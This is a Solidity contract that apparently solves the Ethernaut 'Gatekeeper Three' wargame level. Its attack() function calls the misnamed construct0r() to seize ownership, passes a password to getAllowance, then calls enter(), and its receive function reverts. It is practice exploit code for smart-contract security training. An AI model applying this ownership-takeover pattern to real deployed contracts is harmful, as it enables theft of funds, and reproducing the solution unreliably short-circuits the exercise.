// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {GatekeeperThree} from "./GatekeeperThree.sol";

contract GatekeeperThreeAttacker {
    GatekeeperThree public gatekeeper;
    uint256 public immutable password;

    constructor(address _gatekeeper, uint256 _password) {
        gatekeeper = GatekeeperThree(payable(_gatekeeper));
        password = _password;
    }

    function attack() external {
        gatekeeper.construct0r();
        gatekeeper.getAllowance(password);
        gatekeeper.enter();
    }

    receive() external payable {
        revert();
    }
}
